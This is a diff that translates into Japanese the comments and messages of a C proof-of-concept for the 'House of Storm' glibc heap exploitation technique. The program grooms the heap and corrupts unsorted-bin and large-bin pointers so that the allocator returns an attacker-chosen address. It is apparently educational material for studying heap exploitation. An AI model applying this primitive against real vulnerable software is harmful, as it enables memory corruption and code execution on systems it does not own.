@@ -1,27 +1,25 @@
 /*
 
-POC for House of Storm on 2.26
+2.26 における House of Storm の POC
 
-For 2.26-2.28, the tcache will need to 
-be full for this to work. After this, 
-a patch to the unsorted bin attack prevents this 
-technique from working.
+2.26〜2.28 では、これを動かすには tcache が
+満杯になっている必要があります。それ以降は、unsorted bin 攻撃に対する
+パッチにより、この手法は動作しなくなります。
 
-This technique uses a combination of editing
-an unsorted bin chunk and a large bin chunk
-to write a 'size' to a user choosen address in memory,
-which will get pulled out from the unsorted bin.
+この手法は、unsorted bin のチャンク(chunk)と large bin のチャンクを
+組み合わせて編集することで、ユーザーが選んだメモリ上のアドレスに 'size' を書き込みます。
+そのチャンクは unsorted bin から取り出されることになります。
 
-Once this has occurred, if the size at this 'fake' 
-location is the same size as the allocation, 
-then the chunk will be returned back to the user. 
+これが起こった後、この 'fake'(偽)の位置にあるサイズが
+割り当てのサイズと同じであれば、
+そのチャンクがユーザーに返されます。
 
-This attack allows arbitrary chunks to be returned
-to the user! This requires the following: 
-- Write on free unsorted bin chunk
-- Write on free large bin chunk
-- Known address of target memory address
-- Known address of upper bits of heap chunk
+この攻撃により、任意のチャンクをユーザーに返させることができます。
+これには次のものが必要です。
+- 解放済みの unsorted bin チャンクへの書き込み
+- 解放済みの large bin チャンクへの書き込み
+- 標的のメモリアドレスが既知であること
+- ヒープチャンクの上位ビットのアドレスが既知であること
 
 Written by Maxwell "Strikeout" Dulin
 */
@@ -39,8 +37,8 @@ void init(){
         // clearenv();
 }
 
-// Get the AMOUNT to shift over for size and the offset on the largebin.
-// Needs to be a valid minimum sized chunk in order to work.
+// サイズ用にシフトする量と、largebin 上のオフセットを求めます。
+// 動作するには、有効な最小サイズのチャンクである必要があります。
 int get_shift_amount(char* pointer){
 	
 	int shift_amount = 0;
@@ -51,7 +49,7 @@ int get_shift_amount(char* pointer){
 		shift_amount += 1; 
 	}	
 
-	return shift_amount - 1; // Want amount PRIOR to this being zeroed out
+	return shift_amount - 1; // ゼロになる「直前」の量が欲しいのです
 }
 
 int main(){
@@ -63,88 +61,88 @@ int main(){
 
 	puts("House of Storm"); 
 	puts("======================================"); 
-	puts("Preparing chunks for the exploit");
-	puts("Put one chunk into unsorted bin and the other into the large bin");
-	puts("The unsorted bin chunk MUST be larger than the large bin chunk.");
+	puts("エクスプロイトのためにチャンクを準備します");
+	puts("1つのチャンクを unsorted bin に、もう1つを large bin に入れます");
+	puts("unsorted bin のチャンクは、large bin のチャンクより大きくなければなりません。");
 	/*
-	Putting a chunk into the unsorted bin and another
-	into the large bin.
+	1つのチャンクを unsorted bin に、もう1つを
+	large bin に入れます。
 	*/
 	unsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 
 
-	// prevent merging 
+	// 統合(merge)を防ぎます 
 	malloc ( 0x18 ); 
 
-	puts("Find the proper chunk size to allocate.");
-	puts("Must be exactly the size of the written chunk from above.");
+	puts("割り当てる適切なチャンクサイズを見つけます。");
+	puts("上で書き込んだチャンクのサイズと、ぴったり同じである必要があります。");
 	/* 
-	Find the proper size to allocate
-	We are using the first 'X' bytes of the heap to act 
-	as the 'size' of a chunk. Then, we need to allocate a 
-	chunk exactly this size for the attack to work. 
+	割り当てる適切なサイズを見つけます。
+	ヒープの先頭の 'X' バイトを、チャンクの 'size' として
+	使います。そして、攻撃が動作するには、
+	ちょうどこのサイズのチャンクを割り当てる必要があります。
 
-	So, in order to do this, we have to take the higher
-	bits of the heap address and allocate a chunk of this
-	size, which comes from the upper bytes of the heap address.
+	そのために、ヒープアドレスの上位ビットを取り出し、
+	そのサイズのチャンクを割り当てます。このサイズは、
+	ヒープアドレスの上位バイトに由来します。
 
 	NOTE: 
-	- This does have a 1/2 chance of failing on the 4th bit. If the 4th bit 
-	of this value is set, then the size comparison will fail everytime.
-	- There is ANOTHER 1/4 chance of this failing (for the demo). Either
-	  the mmap bit needs to be set or the non-main arena cannot be set.
-	- Without these calculations, this COULD be brute forced with relative
-	  overwrites in a leakless fashion.
+	- 4ビット目で失敗する確率が 1/2 あります。この値の4ビット目が
+	  立っていると、サイズの比較は毎回失敗します。
+	- (デモでは)失敗する確率がさらに 1/4 あります。mmap ビットが
+	  立っている必要があるか、non-main arena ビットが立っていてはいけません。
+	- これらの計算をしなくても、リークなしで相対上書きを使って
+	  ブルートフォースすることは可能です。
 	*/
 
 	int shift_amount = get_shift_amount(unsorted_bin);	
-	printf("Shift Amount: %d\n", shift_amount); 
+	printf("シフト量: %d\n", shift_amount); 
 
 	size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
 	if(alloc_size < 0x10){
-		printf("Chunk Size: 0x%lx\n", alloc_size);
-		puts("Chunk size is too small");
+		printf("チャンクサイズ: 0x%lx\n", alloc_size);
+		puts("チャンクサイズが小さすぎます");
 		exit(1);
 	}
-	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // Remove the size bits
-	printf("In this case, the chunk size is 0x%lx\n", alloc_size);
+	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // サイズビットを取り除きます
+	printf("この場合、チャンクサイズは 0x%lx です\n", alloc_size);
 
-        // Checks to see if the program will crash or not
+        // プログラムがクラッシュするかどうかを確認します
 	/*
-	The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. 
+	サイズの4ビット目と 'non-main arena' ビットは、立っていてはいけません。そうでないと、チャンクが…。そのため、まずこれを確認する必要があります。 
 
-	Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
-	validates to see if ONE of the following cases is true: 
+	さらに、https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438 にあるコードは、
+	次のいずれか1つが真であることを検証します。 
 	- av == arena_for_chunk (mem2chunk (mem))
-	- chunk is mmaped
+	- チャンクが mmap されている
 
-	If the 'non-main arena' bit is set on the chunk, then the 
-	first case will fail. 
-	If the mmap bit is set, then this will pass. 
+	チャンクに 'non-main arena' ビットが立っていると、
+	1つ目の条件は失敗します。 
+	mmap ビットが立っていれば、これは通過します。 
 	
-	So, either the arenas need to match up (our fake chunk is in the 
-	.bss section for this demo. So, clearly, this will not happen) OR
-	the mmap bit must be set.
+	したがって、arenaが一致している必要があります(このデモでは、偽のチャンクは
+	.bss セクションにあるため、明らかにそうはなりません)。あるいは、
+	mmap ビットが立っている必要があります。
 
-	The logic below validates that the fourth bit of the size
-	is NOT set and that either the mmap bit is set or the non-main 
-	arena bit is NOT set. If this is the case, the exploit should work.
+	以下のロジックは、サイズの4ビット目が立って「いない」こと、
+	および mmap ビットが立っているか、non-main arena ビットが立って「いない」ことを
+	検証します。これが満たされていれば、エクスプロイトは動作するはずです。
 	*/
         if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
-                puts("Allocation size has bit 4 of the size set or ");
-		puts("mmap and non-main arena bit check will fail");
-                puts("Please try again! :)");
-                puts("Exiting...");
+                puts("割り当てサイズの4ビット目が立っているか、");
+		puts("mmap と non-main arena のビットのチェックが失敗します");
+                puts("もう一度試してください! :)");
+                puts("終了します...");
                 return 1;
         }
 
-	// If the chunk would go into the TCache, we need to fill up
-	// the TCache in order to prevent TCache stashing from happening.
+	// チャンクが TCache に入る場合は、TCache のスタッシュ(stashing)が
+	// 起こらないように、TCache を満杯にする必要があります。
 	if(alloc_size < 0x410){
-		puts("Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)");
-		puts("Done to prevent usage of TCache stashing");
+		puts("標的チャンクのサイズが TCache のサイズ(0x20-0x410)の場合は、割り当てサイズの TCache を満杯にします");
+		puts("TCache のスタッシュが使われるのを防ぐためです");
 
 
-		// Fill up the TCache for the proper size
+		// 適切なサイズの TCache を満杯にします
 		for(int i = 0; i < 7; i++){
 			tcaches[i] = malloc(alloc_size);
 		}
@@ -153,133 +151,133 @@ int main(){
 		}
 	}
 	else{
-		puts("Not filling up the TCache");
+		puts("TCache は満杯にしません");
 	}
 
 	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 
-	// prevent merging 
+	// 統合(merge)を防ぎます 
 	malloc ( 0x18 );
 
-	// FIFO 
-	free ( large_bin );  // put small chunks first 
+	// FIFO(先入れ先出し) 
+	free ( large_bin );  // 小さいチャンクを先に入れます 
 	free ( unsorted_bin );
 
-	// Put the 'large bin' chunk into the large bin
+	// 'large bin' のチャンクを large bin に入れます
 	unsorted_bin = malloc(0x4e8);
 	free(unsorted_bin);
 
 	/*
-	At this point, there is a single chunk in the 
-	large bin and a single chunk in the unsorted bin. 
-	It should be noted that the unsorted bin chunk 
-	should be LARGER in size than the large bin chunk
-	but should still be within the same bin.
+	この時点で、large bin には1つのチャンクがあり、
+	unsorted bin にも1つのチャンクがあります。 
+	unsorted bin のチャンクは、large bin のチャンクより
+	サイズが「大きい」必要がありますが、
+	同じ bin の範囲内に収まっている必要があることに注意してください。
 
-	In this setup, the large_bin has a chunk
-	of size 0x4e0 and the unsorted bin 
-	has a chunk of size 0x4f0. This technique relies on
-	the unsorted bin chunk being added to the same bin
-	but a larger chunk size. So, careful heap feng shui 
-	must be done.
+	このセットアップでは、large_bin にはサイズ 0x4e0 の
+	チャンクがあり、unsorted bin にはサイズ 0x4f0 の
+	チャンクがあります。この手法は、unsorted bin のチャンクが
+	同じ bin に追加されるものの、チャンクサイズはより大きいことに
+	依存しています。そのため、ヒープ風水(heap feng shui)を慎重に
+	行う必要があります。
 	*/
 
-	// The address that we want to write to!
+	// 書き込みたいアドレスです!
 	fake_chunk = target - 0x10;
 
-	puts("Vulnerability! Overwrite unsorted bins 'bk' pointer with our target location.\n This is our target location to get from the allocator"); 
+	puts("脆弱性! unsorted bin の 'bk' ポインタを、標的の位置で上書きします。\n これが、アロケータから取得したい標的の位置です"); 
 	
 	/*
-	The address of our fake chunk is set to the unsorted bin 
-	chunks 'bk' pointer. 
+	偽のチャンクのアドレスを、unsorted bin チャンクの
+	'bk' ポインタに設定します。 
 
-	This launches the 'unsorted_bin' attack but it is NOT the
-	main purpose of us doing this.
+	これで 'unsorted_bin' 攻撃が発動しますが、これを行う
+	主な目的ではありません。
 
-	After launching the 'unsorted_bin attack' the 'victim' pointer
-	will be set to THIS address. Our goal is to find a way to get
-	this address from the allocator.
+	'unsorted_bin 攻撃' の発動後、'victim' ポインタは
+	このアドレスに設定されます。目標は、このアドレスを
+	アロケータから取得する方法を見つけることです。
 
-	Vulnerability!!
+	脆弱性!!
 	*/
 	((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk
 
-	// Only needs to be a valid address. 
+	// 有効なアドレスでありさえすればよいのです。 
 	(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin->fd
 
-	puts("Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location");
-	puts("of your fake chunk."); 
-	puts("Misalign the location in order to use the primitive as a SIZE value."); 
-	puts("The 'offset' changes depending on if the binary is PIE (5) or not PIE (2).");
-	puts("Vulnerability #2!");
-	puts("Overwrite large bins bk->nextsize with the address to put our fake chunk size at.");
+	puts("後で、large bin の WRITE-WHERE プリミティブ(primitive)を使って、ヒープポインタを書き込みます。書き込み先は");
+	puts("偽のチャンクの位置です。"); 
+	puts("位置をずらして、このプリミティブを SIZE の値として使います。"); 
+	puts("'オフセット'は、バイナリが PIE の場合(5)と PIE でない場合(2)で変わります。");
+	puts("脆弱性その2!");
+	puts("large bin の bk->nextsize を、偽のチャンクのサイズを置くアドレスで上書きします。");
 	/* 
-	This can be seen as a WRITE-WHERE primitive in the large bin.
-	However, we are going to write a 'size' for our fake chunk using this. 
+	これは、large bin における WRITE-WHERE プリミティブと見なせます。
+	ただし、ここでは、これを使って偽のチャンクの 'size' を書き込みます。 
 
-	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579
-	to an address for our fake size. The write above (bk_nextsize) is
-	controlled via the pointer we are going to overwrite below. The
-	value that gets written is a heap address; the unsorted bin 
-	chunk address above. 
+	そこで、https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579 を
+	偽のサイズ用のアドレスに設定します。上の書き込み(bk_nextsize)は、
+	これから下で上書きするポインタによって制御されます。
+	書き込まれる値はヒープアドレス、つまり上の unsorted bin の
+	チャンクのアドレスです。 
 
-	The 'key' to this is the offset. First, we subtract 0x18 because
-	this is the offset to writting to fd_nextsize in the code shown 
-	above. Secondly, notice the -2 below. We are going
-	to write a 'heap address' at a mis-aligned location and
-	use THIS as the size. For instance, if the heap address is 0x123456
-	and the pointer is set to 0x60006. This will write the following way:
+	この「鍵」はオフセットです。まず、0x18 を引きます。これは、
+	上に示したコードで fd_nextsize に書き込むときのオフセットだからです。
+	次に、下の -2 に注目してください。'ヒープアドレス' を
+	アラインされていない位置に書き込み、
+	それをサイズとして使います。例えば、ヒープアドレスが 0x123456 で、
+	ポインタが 0x60006 に設定されているとします。このとき、次のように書き込まれます。
 	- 0x60006: 0x56
 	- 0x60007: 0x34
 	- 0x60008: 0x12
 
-	Now, our 'fake size' is at 0x60008 and is a valid size for the 
-	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk
-	from the allocator. 
+	これで、'偽のサイズ' は 0x60008 にあり、0x60008 にある
+	偽のチャンクにとって有効なサイズになります。この偽のサイズは、この偽のチャンクを
+	アロケータから取得するために極めて重要です。 
 
-	Second vulnerability!!!
+	2つ目の脆弱性!!!
 
-	// The shift amount is used in order to calculate the proper offset
-	to write the chunk size at, depending on the size of the pointer.
-	This depends on the size of the pointer. 
+	// シフト量は、チャンクサイズを書き込む適切なオフセットを
+	計算するために使われます。ポインタのサイズに応じて決まります。
+	これはポインタのサイズに依存します。 
 	*/
 	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize
 
 	/*
-	At this point, we've corrupted everything in just the right 
-	way so this should work. 
+	この時点で、すべてを適切な形で破壊したので、
+	これで動作するはずです。 
 
-	The purpose of the attack is to have a corrupted 'bk' pointer
-	point to ANYWHERE we want and still get the memory back. We do
-	this by using the large bin code to write a size to the 'bk' 
-	location.
+	この攻撃の目的は、破壊した 'bk' ポインタを
+	好きな「どこか」に向けつつ、そのメモリを返させることです。
+	これは、large bin のコードを使って、'bk' の位置に
+	サイズを書き込むことで実現します。
 
-	This call to calloc, will return a pointer
-	to the fake chunk that we created above. 
+	この calloc の呼び出しは、上で作った偽のチャンクへの
+	ポインタを返します。 
 	*/
 
-	puts("Make allocation of the size that the value will be written for.");
-	puts("Once the allocation happens, the madness begins"); 
-	puts("Once in the unsorted bin, the 'large bin' chunk will be used in orer to "); 
-	puts("write a fake 'size' value to the location of our target."); 
-	puts("After this, the target will have a valid size."); 
-	puts("Next, the unsorted bin will see that the chunk (in unsorted_bin->bk) has a valid"); 
-	puts("size and remove it from the bin.");
-	puts("With this, we have pulled out an arbitrary chunk!");
+	puts("値が書き込まれる対象のサイズで割り当てを行います。");
+	puts("割り当てが起こると、狂乱が始まります"); 
+	puts("unsorted bin に入ると、'large bin' のチャンクが使われて、"); 
+	puts("標的の位置に偽の 'size' の値が書き込まれます。"); 
+	puts("この後、標的は有効なサイズを持つことになります。"); 
+	puts("次に、unsorted bin は、(unsorted_bin->bk にある)チャンクが有効な"); 
+	puts("サイズを持つことを確認して、そのチャンクを bin から取り除きます。");
+	puts("これで、任意のチャンクを取り出しました!");
 
-	printf("String before: %s\n", target);
-	printf("String pointer: %p\n", target);
+	printf("書き換え前の文字列: %s\n", target);
+	printf("文字列のポインタ: %p\n", target);
 
-	puts("Make a call to 'calloc' instead of 'malloc' in order to ");
-	puts("not use the TCache on the allocation. Had to fill TCache");	
-	puts("because stashing would prevent the exploit from working");
+	puts("TCache を使わないようにするために、'malloc' の代わりに");
+	puts("'calloc' を呼び出します。TCache を満杯にしておく必要があったのは、");	
+	puts("スタッシュによってエクスプロイトが動作しなくなるからです");
 
-	// Arena_for_chunk macro may cause this to crash as well
+	// arena_for_chunk マクロによっても、これはクラッシュする可能性があります
 	// https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
 	ptr = calloc(alloc_size, 1);
 	strncpy(ptr, "\x41\x42\x43\x44\x45\x46\x47", 0x58 - 1);
 	
-	printf("String after %s\n", target);
-	printf("Fake chunk ptr: %p\n", ptr);
+	printf("書き換え後の文字列 %s\n", target);
+	printf("偽のチャンクのポインタ: %p\n", ptr);
 
 	return 0;
 }
